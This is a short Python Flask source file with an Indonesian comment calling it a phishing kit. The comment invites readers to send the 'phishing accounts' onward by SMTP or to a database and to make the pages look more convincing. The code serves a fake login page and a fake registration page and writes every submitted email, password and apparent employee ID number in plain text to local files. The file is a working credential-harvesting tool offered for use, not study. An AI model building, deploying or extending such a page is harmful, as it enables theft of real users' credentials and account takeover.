
"""
Language: Bahasa Indonesia
kelian bisa menambah kode nya untuk 
akun phising nya ke email pake smtp dan atau ke database kelian.
code bisa kelian tambah agar lebih mirip
"""

# Module
from flask import Flask, render_template, url_for, redirect, request, flash, session
from flask_toastr import Toastr

import os

# App
app = Flask(__name__)


# Route
@app.route('/', methods=['GET', 'POST'])
def login():
    
    if request.method == 'POST':
       email = request.form.get('email')
       password = request.form.get('password_bo')
       print(email, password)
       r = open('akun.txt', 'a')
       r.write("\n\nEmail: " + email + "\nPassword: " + password)
       r.close()
   
    return render_template('index.html')

@app.route('/daftar', methods=['GET', 'POST'])
def daftar():
    
    if request.method == 'POST':
        nip = request.form.get('nip')
        email_daftar = request.form.get('email_daftar')
        password_daftar = request.form.get('password_daftar')
        print(nip, email_daftar, password_daftar)
        f = open('akun_daftar.txt', 'a')
        f.write("\n\nNip: " + nip + "\nEmail: " + email_daftar + "\nPassword: " + password_daftar)
        f.close()
        
         
    return render_template('daftar.html')

# App Run
if __name__ == "__main__":
    app.run()